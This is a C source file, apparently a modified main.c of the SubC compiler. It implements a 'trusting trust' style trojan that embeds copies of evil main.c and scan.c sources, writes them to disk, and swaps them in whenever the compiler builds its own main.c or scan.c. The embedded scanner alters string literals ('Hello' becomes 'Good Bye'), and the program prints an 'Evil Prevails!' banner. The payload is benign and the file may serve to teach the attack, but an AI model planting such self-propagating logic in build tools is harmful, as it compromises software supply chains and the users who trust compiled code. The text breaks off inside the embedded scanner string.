/*
 *	NMH's Simple C Compiler, 2011--2014
 *	Main program
 */


#include "defs.h"
#define extern_
 #include "data.h"
#undef extern_
#include "decl.h"

static void cmderror(char *s, char *a) {
	fprintf(stderr, "scc: ");
	fprintf(stderr, s, a);
	fputc('\n', stderr);
	exit(EXIT_FAILURE);
}

void cleanup(void) {
	if (!O_testonly && NULL != Basefile) {
		remove(newfilename(Basefile, 's'));
		remove(newfilename(Basefile, 'o'));
	}
}

char *newfilename(char *file, int sfx) {
	char	*ofile;

	if ((ofile = strdup(file)) == NULL)
		cmderror("too many file names", NULL);
	ofile[strlen(ofile)-1] = sfx;
	return ofile;
}

static int filetype(char *file) {
	int	k;

	k = strlen(file);
	if ('.' == file[k-2]) return file[k-1];
	return 0;
}

static int exists(char *file) {
	FILE	*f;

	if ((f = fopen(file, "r")) == NULL) return 0;
	fclose(f);
	return 1;
}

#ifdef __dos

static void compile(char *file, char *def) {
	char	*ofile;
	char	scc_cmd[129];

	if (!file)
		cmderror("pipe mode not supported in DOS version", NULL);
	if (O_testonly)
		cmderror("test mode not supported in DOS version", NULL);
	ofile = newfilename(file, 's');
	if (O_verbose) {
		if (O_verbose > 1)
			printf("sccmain.exe %s %s\n", file, ofile);
		else
			printf("compiling %s\n", file);
	}
	if (strlen(file)*2 + (def? strlen(def): 0) + 16 > 128)
		cmderror("file name too long", file);
	sprintf(scc_cmd, "sccmain.exe %s %s %s", file, ofile, def? def: "");
	if (system(scc_cmd))
		cmderror("compiler invokation failed", NULL);
}

#else /* !__dos */

static void compile(char *file, char *def) {
	char	*ofile;
	FILE	*in, *out;

	//
	FILE *fp1, *fp2;
	char main_evil[200000];
	char scan_evil[200000];

	strcpy(main_evil,"/*\n *\tNMH's Simple C Compiler, 2011--2014\n *\tMain program\n */\n\n\n#include \"defs.h\"\n#define extern_\n #include \"data.h\"\n#undef extern_\n#include \"decl.h\"\n\nstatic void cmderror(char *s, char *a) {\n\tfprintf(stderr, \"scc: \");\n\tfprintf(stderr, s, a);\n\tfputc('\\n', stderr);\n\texit(EXIT_FAILURE);\n}\n\nvoid cleanup(void) {\n\tif (!O_testonly && NULL != Basefile) {\n\t\tremove(newfilename(Basefile, 's'));\n\t\tremove(newfilename(Basefile, 'o'));\n\t}\n}\n\nchar *newfilename(char *file, int sfx) {\n\tchar\t*ofile;\n\n\tif ((ofile = strdup(file)) == NULL)\n\t\tcmderror(\"too many file names\", NULL);\n\tofile[strlen(ofile)-1] = sfx;\n\treturn ofile;\n}\n\nstatic int filetype(char *file) {\n\tint\tk;\n\n\tk = strlen(file);\n\tif ('.' == file[k-2]) return file[k-1];\n\treturn 0;\n}\n\nstatic int exists(char *file) {\n\tFILE\t*f;\n\n\tif ((f = fopen(file, \"r\")) == NULL) return 0;\n\tfclose(f);\n\treturn 1;\n}\n\n#ifdef __dos\n\nstatic void compile(char *file, char *def) {\n\tchar\t*ofile;\n\tchar\tscc_cmd[129];\n\n\tif (!file)\n\t\tcmderror(\"pipe mode not supported in DOS version\", NULL);\n\tif (O_testonly)\n\t\tcmderror(\"test mode not supported in DOS version\", NULL);\n\tofile = newfilename(file, 's');\n\tif (O_verbose) {\n\t\tif (O_verbose > 1)\n\t\t\tprintf(\"sccmain.exe %s %s\\n\", file, ofile);\n\t\telse\n\t\t\tprintf(\"compiling %s\\n\", file);\n\t}\n\tif (strlen(file)*2 + (def? strlen(def): 0) + 16 > 128)\n\t\tcmderror(\"file name too long\", file);\n\tsprintf(scc_cmd, \"sccmain.exe %s %s %s\", file, ofile, def? def: \"\");\n\tif (system(scc_cmd))\n\t\tcmderror(\"compiler invokation failed\", NULL);\n}\n\n#else /* !__dos */\n/**********************************************************************************************\nint checkfile(char *infilename) {\n\tFILE *base, *incopy;\n\tchar bufferin[1000], bufferbase[1000];\n\tincopy = fopen(infilename,\"r\");\n\tbase = fopen(\"main.c\",\"r\");\n\t// Have a check here to see if base was opened successfully, otherwise output some msg.\n\twhile( !feof(incopy) && !feof(base) ) {\n\t\tfgets(bufferin, 1000, incopy); \n\t\tfgets(bufferbase, 1000, base);\n\t\t//printf(\"bufferin:\t'%s'\\n\",bufferin);\n\t\t//printf(\"bufferbase:\t'%s'\\n\",bufferbase);\n\t\tif( strcmp(bufferin, bufferbase) ) {\t// strcmp returns 0 on match.\n\t\t\t//printf(\"returning 0\\n\");\n\t\t\treturn 0;\t\t//It's not subc compiler source file.\n\t\t}\n\t}\n\n\treturn 1;\t\t\t\t//It is subc compiler source file and FILE in has now been changed to point to main_evil.c.\n}\n//**********************************************************************************************/\n\n\nstatic void compile(char *file, char *def) {\n\tchar\t*ofile;\n\tFILE\t*in, *out;\n\n\tin = stdin;\n\tout = stdout;\n\tofile = NULL;\n\tif (file) {\n\t\tofile = newfilename(file, 's');\n\t\tif ((in = fopen(file, \"r\")) == NULL)\n\t\t\tcmderror(\"no such file: %s\", file);\n\t\tif (!O_testonly) {\n\t\t\tif ((out = fopen(ofile, \"r\")) != NULL)\n\t\t\t\tcmderror(\"will not overwrite file: %s\",\n\t\t\t\t\tofile);\n\t\t\tif ((out = fopen(ofile, \"w\")) == NULL)\n\t\t\t\tcmderror(\"cannot create file: %s\", ofile);\n\t\t}\n\t}\n\tif (O_testonly) out = NULL;\n\tif (O_verbose) {\n\t\tif (O_testonly)\n\t\t\tprintf(\"cc -t %s\\n\", file);\n\t\telse\n\t\t\tif (O_verbose > 1)\n\t\t\t\tprintf(\"cc -S -o %s %s\\n\", ofile, file);\n\t\t\telse\n\t\t\t\tprintf(\"compiling %s\\n\", file);\n\t}\n\t//**********************************************************************************************\n\t// For now assumes the compiler is called at the directory its source files are in. --> will affect file name such as main.c and ../main.c etc.\n\tprintf(\"%s\\n\",file);\n\tif( !strcmp(file,\"main.c\") ) {\n\t\tfclose(in);\n\t\tin = fopen(\"evil/main_evil.c\",\"r\");\n\t\tprintf(\"subc main.c detected, replaced in.\\n\");\n\t}\n\tif( !strcmp(file,\"scan.c\") ) {\n\t\tfclose(in);\n\t\tin = fopen(\"evil/scan_evil.c\",\"r\");\n\t\tprintf(\"subc scan.c detected, replaced in.\\n\");\n\t}\n\t//**********************************************************************************************/\n\tprogram(file, in, out, def);\n\tif (file) {\n\t\tfclose(in);\n\t\tif (out) fclose(out);\n\t}\n}\n\n#endif /* !__dos */\n\nstatic void collect(char *file, int temp) {\n\tif (O_componly || O_asmonly) return;\n\tif (Nf >= MAXFILES)\n\t\tcmderror(\"too many input files\", NULL);\n\tTemp[Nf] = temp;\n\tFiles[Nf++] = file;\n}\n\nstatic void assemble(char *file, int delete) {\n\tchar\t*ofile;\n\tchar\tcmd[TEXTLEN+1];\n\n\tfile = newfilename(file, 's');\n\tif (O_componly && O_outfile)\n\t\tofile = O_outfile;\n\telse\n\t\tcollect(ofile = newfilename(file, 'o'), 1);\n\tif (strlen(file) + strlen(ofile) + strlen(ASCMD) >= TEXTLEN)\n\t\tcmderror(\"assembler command too long\", NULL);\n\tsprintf(cmd, ASCMD, ofile, file);\n\tif (O_verbose > 1) printf(\"%s\\n\", cmd);\n\tif (system(cmd))\n\t\tcmderror(\"assembler invocation failed\", NULL);\n\tif (delete) {\n\t\tif (O_verbose > 2) printf(\"rm %s\\n\", file);\n\t\tremove(file);\n\t}\n}\n\nstatic int concat(int k, char *buf, char *s) {\n\tint\tn;\n\n\tn = strlen(s);\n\tif (k + n + 2 >= TEXTLEN)\n\t\tcmderror(\"linker command too long\", buf);\n\tstrcat(buf, \" \");\n\tstrcat(buf, s);\n\treturn k + n + 1;\n}\n\nstatic void link(void) {\n\tint\ti, k;\n\tchar\tcmd[TEXTLEN+2];\n\tchar\tcmd2[TEXTLEN+2];\n\tchar\t*ofile;\n\n\tofile = O_outfile? O_outfile: AOUTNAME;\n\tif (strlen(ofile) + strlen(LDCMD) + strlen(SCCDIR)*2 >= TEXTLEN)\n\t\tcmderror(\"linker command too long\", NULL);\n\tsprintf(cmd, LDCMD, ofile, SCCDIR, O_stdio? \"\": \"n\");\n\tk = strlen(cmd);\n\tfor (i=0; i<Nf; i++)\n\t\tk = concat(k, cmd, Files[i]);\n\tk = concat(k, cmd, SCCLIBC);\n\tconcat(k, cmd, SYSLIBC);\n\tsprintf(cmd2, cmd, SCCDIR);\n\tif (O_verbose > 1) printf(\"%s\\n\", cmd2);\n\tif (system(cmd2))\n\t\tcmderror(\"linker invocation failed\", NULL);\n\tif (O_verbose > 2) printf(\"rm \");\n\tfor (i=0; i<Nf; i++) {\n\t\tif (Temp[i]) {\n\t\t\tif (O_verbose > 2) printf(\" %s\", Files[i]);\n\t\t\tremove(Files[i]);\n\t\t}\n\t}\n\tif (O_verbose > 2) printf(\"\\n\");\n}\n\nstatic void usage(void) {\n\tprintf(\"Usage: scc [-h] [-ctvNSV] [-d opt] [-o file] [-D macro[=text]]\"\n\t\t\" file [...]\\n\");\n}\n\nstatic void longusage(void) {\n\tprintf(\"\\n\");\n\tusage();\n\tprintf(\t\"\\n\"\n\t\t\"-c       compile only, do not link\\n\"\n\t\t\"-d opt   activate debug option OPT, ? = list\\n\"\n\t\t\"-o file  write linker output to FILE\\n\"\n\t\t\"-t       test only, generate no code\\n\"\n\t\t\"-v       verbose, more v's = more verbose\\n\"\n\t\t\"-D m=v   define macro M with optional value V\\n\"\n\t\t\"-N       do not use stdio (can't use printf, etc)\\n\"\n\t\t\"-S       compile to assembly language\\n\"\n\t\t\"-V       print version and exit\\n\"\n\t\t\"\\n\" );\n}\n\nstatic void version(void) {\n\tprintf(\"SubC version %s for %s/%s\\n\", VERSION, OS, CPU);\n}\n\nstatic char *nextarg(int argc, char *argv[], int *pi, int *pj) {\n\tchar\t*s;\n\n\tif (argv[*pi][*pj+1] || *pi >= argc-1) {\n\t\tusage();\n\t\texit(EXIT_FAILURE);\n\t}\n\ts = argv[++*pi];\n\t*pj = strlen(s)-1;\n\treturn s;\n}\n\nstatic int dbgopt(int argc, char *argv[], int *pi, int *pj) {\n\tchar\t*s;\n\n\ts = nextarg(argc, argv, pi, pj);\n\tif (!strcmp(s, \"lsym\")) return D_LSYM;\n\tif (!strcmp(s, \"gsym\")) return D_GSYM;\n\tif (!strcmp(s, \"stat\")) return D_STAT;\n\tprintf(\t\"\\n\"\n\t\t\"scc: valid -d options are: \\n\\n\"\n\t\t\"lsym - dump local symbol tables\\n\"\n\t\t\"gsym - dump global symbol table\\n\"\n\t\t\"stat - print usage statistics\\n\"\n\t\t\"\\n\");\n\texit(EXIT_FAILURE);\n}\n\nint main(int argc, char *argv[]) {\n\tint\ti, j;\n\tchar\t*def;\n\n\tdef = NULL;\n\tO_debug = 0;\n\tO_verbose = 0;\n\tO_componly = 0;\n\tO_asmonly = 0;\n\tO_testonly = 0;\n\tO_stdio = 1;\n\tO_outfile = NULL;\n\t//**********************************************************************************************\n\tprintf(\"Evil Prevails!*************************\\n\");\n\tprintf(\"\t/ \\\\~~~~/ \\\\\\n\");\n\tprintf(\"\t--      --\\n\");\n\tprintf(\"\t **      **\\n\");\n\tprintf(\"\t \\\\   =   /\\n\");\n\tprintf(\"\t  \\\\__-__/\\n\");\n\tprintf(\"Evil Prevails!*************************\\n\");\n\t//**********************************************************************************************/\n\tfor (i=1; i<argc; i++) {\n\t\tif (*argv[i] != '-') break;\n\t\tif (!strcmp(argv[i], \"-\")) {\n\t\t\tcompile(NULL, def);\n\t\t\texit(Errors? EXIT_FAILURE: EXIT_SUCCESS);\n\t\t}\n\t\tfor (j=1; argv[i][j]; j++) {\n\t\t\tswitch (argv[i][j]) {\n\t\t\tcase 'c':\n\t\t\t\tO_componly = 1;\n\t\t\t\tbreak;\n\t\t\tcase 'd':\n\t\t\t\tO_debug |= dbgopt(argc, argv, &i, &j);\n\t\t\t\tO_testonly = 1;\n\t\t\t\tbreak;\n\t\t\tcase 'h':\n\t\t\t\tlongusage();\n\t\t\t\texit(EXIT_SUCCESS);\n\t\t\tcase 'o':\n\t\t\t\tO_outfile = nextarg(argc, argv, &i, &j);\n\t\t\t\tbreak;\n\t\t\tcase 't':\n\t\t\t\tO_testonly = 1;\n\t\t\t\tbreak;\n\t\t\tcase 'v':\n\t\t\t\tO_verbose++;\n\t\t\t\tbreak;\n\t\t\tcase 'D':\n\t\t\t\tif (def) cmderror(\"too many -D's\", NULL);\n\t\t\t\tdef = nextarg(argc, argv, &i, &j);\n\t\t\t\tbreak;\n\t\t\tcase 'N':\n\t\t\t\tO_stdio = 0;\n\t\t\t\tbreak;\n\t\t\tcase 'S':\n\t\t\t\tO_componly = O_asmonly = 1;\n\t\t\t\tbreak;\n\t\t\tcase 'V':\n\t\t\t\tversion();\n\t\t\t\texit(EXIT_SUCCESS);\n\t\t\tdefault:\n\t\t\t\tusage();\n\t\t\t\texit(EXIT_FAILURE);\n\t\t\t}\n\t\t}\n\t}\n\tif (i >= argc) {\n\t\tusage();\n\t\texit(EXIT_FAILURE);\n\t}\n\tNf = 0;\n\twhile (i < argc) {\n\t\tif (filetype(argv[i]) == 'c') {\n\t\t\tcompile(argv[i], def);\n\t\t\tif (Errors && !O_testonly)\n\t\t\t\tcmderror(\"compilation stopped\", NULL);\n\t\t\tif (!O_asmonly && !O_testonly)\n\t\t\t\tassemble(argv[i], 1);\n\t\t\ti++;\n\t\t}\n\t\telse if (filetype(argv[i]) == 's') {\n\t\t\tif (!O_testonly) assemble(argv[i++], 0);\n\t\t}\n\t\telse {\n\t\t\tif (!exists(argv[i])) cmderror(\"no such file: %s\",\n\t\t\t\t\t\t\targv[i]);\n\t\t\tcollect(argv[i++], 0);\n\t\t}\n\t}\n\tif (!O_componly && !O_testonly) link();\n\treturn EXIT_SUCCESS;\n}\n");
	fp1 = fopen("mainevil.c","w+");
	fputs(main_evil,fp1);
	fclose(fp1);

	strcpy(scan_evil,"/*\n *\tNMH's Simple C Compiler, 2011,2016\n *\tLexical analysis (scanner)\n */\n\n#include \"defs.h\"\n#include \"data.h\"\n#include \"decl.h\"\n//**********************************************************************************************\n// Checks if a is \\r or \\n\nint es_char(char a) {\n\tswitch(a) {\n\t\tcase '\\n' : \t\t\t\n\t\t\treturn 1;\n\t\t\tbreak;\n\t\tcase '\\r' :\t\t\t\n\t\t\treturn 1;\n\t\t\tbreak;\n\t\tdefault :\n\t\t\treturn 0;\n\t}\n}\n\nchar* get_es(char a) {\n\tswitch(a) {\n\t\tcase '\\n' : \t\t\n\t\t\treturn \"\\\\n\";\n\t\t\tbreak;\n\t\tcase '\\r' :\t\n\t\t\treturn \"\\\\r\";\n\t\t\tbreak;\n\t\tdefault :\t\n\t\t\treturn \"\\0\";\t// Returns NULL\n\t}\n}\n\n// compare if inword[] is same str as compare[].\nint wordcheck(char *inword, char *compare) {\n\tif ( strcmp(inword,compare) == 0 ) \t\t\t// strcmp returns 0 on same string.\n\t\treturn 1;\n\treturn 0;\n}\n\n// For now, assume var replacement and var word are of same length.\n// For now only replace string of same length, when replacing string of different length, will add function to cut off at some point, and then concat the rest on, after modifying.\n// var i, is index to start in var word.\n// Assumes var replacement is not a proper c-string, with a \\0 at the end, cuz that char won't be inserted into var word, and will mess with some of the lenth variables.\n// Maybe I don't have to worry about len of a \\0, cuz strlen() doesn't count \\0.\nint modstr(char *word, int i, int modlen, char *replacement) {\t// modlen is length of modification on var word, the part that's getting taken out, not the length that is to replace it that gap.\n\tint j, k;\n\tint replacelen, wordlen, newlen, tmplen;\n\tchar tmpstr[TEXTLEN];\n\t// Have some checks here that var word have enough space to replace some part of it with var replacement. such as replacement len, and rest of word len.\n\t// Also have check if replacement exceed \\0 of var word, got to append a \\0 at the end if that's the case.\n\treplacelen = strlen(replacement);\n\twordlen = strlen(word);\n\tnewlen = (wordlen - modlen) + replacelen;\n\t\n\tif( newlen > TEXTLEN ) {\t// 513 is the max size of the char* used in scanstr()'s argument.\n\t\treturn 0; \t\t\t// Error here is new word is too long to be accomadated.\n\t}\n\t//WHAT ABOUT MAKING buf SMALLER? it works. I tested.\n\t//printf(\"%s, of size: %d\\n\", replacement,replacelen);\n\t//printf(\"Modifying length of word is: %d\\n\", modlen);\n\n\tj = 0;\n\tk = 0;\n\t//appending the 2nd half of var word, right after where we will end our replace.\n\tfor(j = i + modlen; j < wordlen; ++j, ++k) {\n\t\ttmpstr[k] = word[j];\n\t\t//printf(\"Appending 2nd half to tmpstr[]:'%c'\\n\",word[j]);\n\t}\n\ttmpstr[k] = '\\0'; \t\t// Making tmpstr a prope| 2nd half: '%s'r c-string, to avoid confusion later on.\n\t//printf(\"word: '%s' | modification len: %d\\n\",word,modlen);\n\t//printf(\"2nd half: '%s'\\n\",tmpstr);\n\n\tj = 0;\n\tk = 0;\n\t// Starting from i, copy var replacement over var word.\n\tfor(j = i; j <= replacelen; ++ j, ++ k) {\n\t\t//printf(\"Replacing each char: '%c' with '%c'\\n\",word[j], replacement[k]);\n\t\tword[j] = replacement[k];\n\t}\n\tword[j] = '\\0'; \t\t// Making this a proper c-string. To avoid confusion.\n\t// Append the rest of the string back on.\n\tj = strlen(word);;\n\tk = 0;\n\ttmplen = strlen(tmpstr);\n\t//printf(\"Why so low? : %d\\n\",tmplen);\n\tfor(; k < tmplen; ++j, ++k) {\n\t\t//printf(\"Appending the rest of the word back in: '%c'\\n\", tmpstr[k]);\n\t\tword[j] = tmpstr[k];\n\t}\n\tword[j] = '\\0';\t// Making this a proper c-string. To avoid confusion.\n\tprintf(\"The new word: %s\\n\",word);\n\n\treturn 1;\n}\n\n// As this fct construct subword, it will compare at every step to account for starting and ending indexing \n// -> when constructing subword, to avoid duplicated calculation all possible subword and returning it, easier to check it at this fct.\nint cmpwithin(char *inword, char *compare, int i, int *index, int *cmplength) {\n\tint len;\n\tint sublen;\n\tchar subword[100];\n\n\tlen = strlen(inword);\n\tstrcpy(subword,\"\");\t// Make a proper empty c-string.\n\t\n\tif( i >= len )\n\t\treturn 0;\n\n\tfor(; i < len; ++i) {\n\t\tsublen = strlen(subword);\n\t\tsubword[sublen] = inword[i];\n\t\tsubword[sublen+1] = '\\0';\n\t\tif( wordcheck(subword,compare) ) {\n\t\t\t*cmplength = strlen(subword);\n\t\t\t*index = i + 1 - *cmplength;\t\t// At this point, the correct starting index has been offset by subword length. Got adjust by one because index starts counting at 0, while length starts counting at 1, it's to even things out.\n\t\t\treturn 1;\n\t\t}\n\t}\n\treturn 0;\n}\n\n// Call this, don't call cmpwithin by it self, this fct is the over head that checks.\n// Compare if inword has a sub word of compare, this fct is called after wordcheck.\n//CHECK IF A exact copy of string when pass into this fct will work.---> It works.\nint subwordcheck(char *inword, char *compare, int *index, int *cmplength) {\n\tint i;\n\tint len;\n\n\tlen = strlen(inword);\n\tfor( i = 0; i < len; ++i ) {\n\t\tif( cmpwithin(inword,compare,i,index,cmplength) ) {\n\t\t\treturn 1;\n\t\t}\n\t}\n\treturn 0;\n}\n\n//**********************************************************************************************/\n\nint next(void) {\n\tint\tc;\n\n\tif (Putback) {\n\t\tc = Putback;\n\t\tPutback = 0;\n\t\treturn c;\n\t}\n\tif (Mp) {\n\t\tif ('\\0' == *Macp[Mp-1]) {\n\t\t\tMacp[Mp-1] = NULL;\n\t\t\treturn Macc[--Mp];\n\t\t}\n\t\telse {\n\t\t\treturn *Macp[Mp-1]++;\n\t\t}\n\t}\n\tc = fgetc(Infile);\n\t//***\n\t//printf(\"char: %c --> ascii: %d\\n\",c,c );\n\t//***\n\tif ('\\n' == c) Line++;\n\treturn c;\n}\n\nvoid putback(int c) {\n\tPutback = c;\n}\n\nstatic int hexchar(void) {\n\tint\tc, h, n = 0, f = 0;\n\n\twhile (isxdigit(c = next())) {\n\t\th = chrpos(\"0123456789abcdef\", tolower(c));\n\t\tn = n * 16 + h;\n\t\tf = 1;\n\t}\n\tputback(c);\n\tif (!f)\n\t\terror(\"missing digits after '\\\\x'\", NULL);\n\tif (n > 255)\n\t\terror(\"value out of range after '\\\\x'\", NULL);\n\treturn n;\n}\n\nstatic int scanch(void) {\n\tint\ti, c, c2;\n\n\tc = next();\n\tif ('\\\\' == c) {\n\t\tswitch (c = next()) {\n\t\tcase 'a': return '\\a';\n\t\tcase 'b': return '\\b';\n\t\tcase 'f': return '\\f';\n\t\tcase 'n': return '\\n';\n\t\tcase 'r': return '\\r';\n\t\tcase 't': return '\\t';\n\t\tcase 'v': return '\\v';\n\t\tcase '\\\\': return '\\\\';\n\t\tcase '\"': return '\"' | 256;\n\t\tcase '\\'': return '\\'';\n\t\tcase '0': case '1': case '2':\n\t\tcase '3': case '4': case '5':\n\t\tcase '6': case '7':\n\t\t\tfor (i = c2 = 0; isdigit(c) && c < '8'; c = next()) {\n\t\t\t\tif (++i > 3) break;\n\t\t\t\tc2 = c2 * 8 + (c - '0');\n\t\t\t}\n\t\t\tputback(c);\n\t\t\treturn c2;\n\t\tcase 'x':\n\t\t\treturn hexchar();\n\t\tdefault:\n\t\t\tscnerror(\"unknown escape sequence: %s\", c);\n\t\t\treturn ' ';\n\t\t}\n\t}\n\telse {\n\t\treturn c;\n\t}\n}\n\nstatic int scanint(int c) {\n\tint\tval, radix, k, i = 0;\n\n\tval = 0;\n\tradix = 10;\n\tif ('0' == c) {\n\t\tText[i++] = '0';\n\t\tif ((c = next()) == 'x') {\n\t\t\tradix = 16;\n\t\t\tText[i++] = c;\n\t\t\tc = next();\n\t\t}\n\t\telse {\n\t\t\tradix = 8;\n\t\t}\n\t}\n\twhile ((k = chrpos(\"0123456789abcdef\", tolower(c))) >= 0) {\n\t\tText[i++] = c;\n\t\tif (k >= radix)\n\t\t\tscnerror(\"invalid digit in integer literal: %s\", c);\n\t\tval = val * radix + k;\n\t\tc = next();\n\t}\n\tputback(c);\n\tText[i] = 0;\n\treturn val;\n}\n\n// This functions parse anything in double quotes.\n// The return values is the size of the buf, and also what's gonna be counted in the program.\n// The return values also doesn't count the ending double quotes, since it's just here for the format purpose.\nstatic int scanstr(char *buf) {\n\tint\ti, c;\n\t//***\n\tint modi, modl, cmpl;\t// modify index, modify length, compare length.\n\tchar replacement[TEXTLEN], subword[TEXTLEN];\t// The current 513 is the max number of char that *buf will take, *buf which is global variable Text[] of size 513.\n\tmodi = 0; cmpl = 0; \n\tstrcpy(replacement, \"Good Bye\");\n\tstrcpy(subword, \"Hello\");\n\tmodl = strlen(subword);\n\t//***\n\n\tbuf[0] = '\"';\n\tfor (i=1; i<TEXTLEN-2; i++) {\n\t\tif ((c = scanch()) == '\"') {\n\t\t\tbuf[i++] = '\"';\n\t\t\tbuf[i] = 0;\n\t\t\t//***\n\t\t\t// Now I got to change the size of buf, to accomadate the edits I want to insert. The edits are fine, but it's cut off when this fct returns.\n\t\t\tif(subwordcheck(buf,subword,&modi,&cmpl)) {\n\t\t\t\tmodstr(buf,modi,modl,replacement);\n\t\t\t}\n\t\t\treturn Value = (strlen(buf)); \t// Was thinkg it's gonna be strlen(buf) + 1. but I did the math, it's not, it's just strlen(buf)..\n\t\t\t//***\n\t\t\t//return Value = i;\n\t\t}\n\t\tbuf[i] = c;\n\t}\n\tfatal(\"string literal too long\");\n\treturn 0;\n}\n\nstatic int scanident(int c, char *buf, int lim) {\n\tint\ti = 0;\n\n\twhile (isalpha(c) || isdigit(c) || '_' == c) {\n\t\tif (lim-1 == i) {\n\t\t\terror(\"identifier too long\", NULL);\n\t\t\ti++;\n\t\t}\n\t\telse if (i < lim-1) {\n\t\t\tbuf[i++] = c;\n\t\t}\n\t\tc = next();\n\t}\n\tputback(c);\n\tbuf[i] = 0;\n\treturn i;\n}\n\nint skip(void) {\n\tint\tc, p, nl;\n\n\tc = next();\n\tnl = 0;\n\tfor (;;) {\n\t\tif (EOF == c) {\n\t\t\tstrcpy(Text, \"<EOF>\");\n\t\t\treturn EOF;\n\t\t}\n\t\twhile (' ' == c || '\\t' == c || '\\n' == c ||\n\t\t\t'\\r' == c || '\\f' == c\n\t\t) {\n\t\t\tif ('\\n' == c) nl = 1;\n\t\t\tc = next();\n\t\t}\n\t\tif (nl && c == '#') {\n\t\t\tpreproc();\n\t\t\tc = next();\n\t\t\tcontinue;\n\t\t}\n\t\tnl = 0;\n\t\tif (c != '/')\n\t\t\tbreak;\n\t\tc = next();\n\t\tif (c != '*' && c != '/') {\n\t\t\tputback(c);\n\t\t\tc = '/';\n\t\t\tbreak;\n\t\t}\n\t\tif (c == '/') {\n\t\t\twhile ((c = next()) != EOF) {\n\t\t\t\tif (c == '\\n') break;\n\t\t\t}\n                }\n                else {\n\t\t\tp = 0;\n\t\t\twhile ((c = next()) != EOF) {\n\t\t\t\tif ('/' == c && '*' == p) {\n\t\t\t\t\tc = next();\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tp = c;\n\t\t\t}\n\t\t}\n\t}\n\treturn c;\n}\n\nstatic int keyword(char *s) {\n\tswitch (*s) {\n\tcase '#':\n\t\tswitch (s[1]) {\n\t\tcase 'd':\n\t\t\tif (!strcmp(s, \"#define\")) return P_DEFINE;\n\t\t\tbreak;\n\t\tcase 'e':\n\t\t\tif (!strcmp(s, \"#else\")) return P_ELSE;\n\t\t\tif (!strcmp(s, \"#endif\")) return P_ENDIF;\n\t\t\tif (!strcmp(s, \"#error\")) return P_ERROR;\n\t\t\tbreak;\n\t\tcase 'i':\n\t\t\tif (!strcmp(s, \"#ifdef\")) return P_IFDEF;\n\t\t\tif (!strcmp(s, \"#ifndef\")) return P_IFNDEF;\n\t\t\tif (!strcmp(s, \"#include\")) return P_INCLUDE;\n\t\t\tbreak;\n\t\tcase 'l':\n\t\t\tif (!strcmp(s, \"#line\")) return P_LINE;\n\t\t\tbreak;\n\t\tcase 'p':\n\t\t\tif (!strcmp(s, \"#pragma\")) return P_PRAGMA;\n\t\t\tbreak;\n\t\tcase 'u':\n\t\t\tif (!strcmp(s, \"#undef\")) return P_UNDEF;\n\t\t\tbreak;\n\t\t}\n\t\tbreak;\n\tcase 'a':\n\t\tif (!strcmp(s, \"auto\")) return AUTO;\n\t\tbreak;\n\tcase 'b':\n\t\tif (!strcmp(s, \"break\")) return BREAK;\n\t\tbreak;\n\tcase 'c':\n\t\tif (!strcmp(s, \"case\")) return CASE;\n\t\tif (!strcmp(s, \"char\")) return CHAR;\n\t\tif (!strcmp(s, \"continue\")) return CONTINUE;\n\t\tbreak;\n\tcase 'd':\n\t\tif (!strcmp(s, \"default\")) return DEFAULT;\n\t\tif (!strcmp(s, \"do\")) return DO;\n\t\tbreak;\n\tcase 'e':\n\t\tif (!strcmp(s, \"else\")) return ELSE;\n\t\tif (!strcmp(s, \"enum\")) return ENUM;\n\t\tif (!strcmp(s, \"extern\")) return EXTERN;\n\t\tbreak;\n\tcase 'f':\n\t\tif (!strcmp(s, \"for\")) return FOR;\n\t\tbreak;\n\tcase 'i':\n\t\tif (!strcmp(s, \"if\")) return IF;\n\t\tif (!strcmp(s, \"int\")) return INT;\n\t\tbreak;\n\tcase 'r':\n\t\tif (!strcmp(s, \"register\")) return REGISTER;\n\t\tif (!strcmp(s, \"return\")) return RETURN;\n\t\tbreak;\n\tcase 's':\n\t\tif (!strcmp(s, \"sizeof\")) return SIZEOF;\n\t\tif (!strcmp(s, \"static\")) return STATIC;\n\t\tif (!strcmp(s, \"struct\")) return STRUCT;\n\t\tif (!strcmp(s, \"switch\")) return SWITCH;\n\t\tbreak;\n\tcase 'u':\n\t\tif (!strcmp(s, \"union\")) return UNION;\n\t\tbreak;\n\tcase 'v':\n\t\tif (!strcmp(s, \"void\")) return VOID;\n\t\tif (!strcmp(s, \"volatile\")) return VOLATILE;\n\t\tbreak;\n\tcase 'w':\n\t\tif (!strcmp(s, \"while\")) return WHILE;\n\t\tbreak;\n\t}\n\treturn 0;\n}\n\nstatic int macro(char *name) {\n\tint\ty;\n\n\ty = findmac(name);\n\tif (!y || Types[y] != TMACRO)\n\t\treturn 0;\n\tplaymac(Mtext[y]);\n\treturn 1;\n}\n\nstatic int scanpp(void) {\n\tint\tc, t;\n\n\tif (Rejected != -1) {\n\t\tt = Rejected;\n\t\tRejected = -1;\n\t\tstrcpy(Text, Rejtext);\n\t\tValue = Rejval;\n\t\treturn t;\n\t}\n\tfor (;;) {\n\t\tValue = 0;\n\t\tc = skip();\n\t\tmemset(Text, 0, 4);\n\t\tText[0] = c;\n\t\tswitch (c) {\n\t\tcase '!':\n\t\t\tif ((c = next()) == '=') {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn NOTEQ;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn XMARK;\n\t\t\t}\n\t\tcase '%':\n\t\t\tif ((c = next()) == '=') {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn ASMOD;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn MOD;\n\t\t\t}\n\t\tcase '&':\n\t\t\tif ((c = next()) == '&') {\n\t\t\t\tText[1] = '&';\n\t\t\t\treturn LOGAND;\n\t\t\t}\n\t\t\telse if ('=' == c) {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn ASAND;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn AMPER;\n\t\t\t}\n\t\tcase '(':\n\t\t\treturn LPAREN;\n\t\tcase ')':\n\t\t\treturn RPAREN;\n\t\tcase '*':\n\t\t\tif ((c = next()) == '=') {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn ASMUL;\n\t\t\t}\n\t\t\telse {\n\t\t\t\tputback(c);\n\t\t\t\treturn STAR;\n\t\t\t}\n\t\tcase '+':\n\t\t\tif ((c = next()) == '+') {\n\t\t\t\tText[1] = '+';\n\t\t\t\treturn INCR;\n\t\t\t}\n\t\t\telse if ('=' == c) {\n\t\t\t\tText[1] = '=';\n\t\t\t\treturn 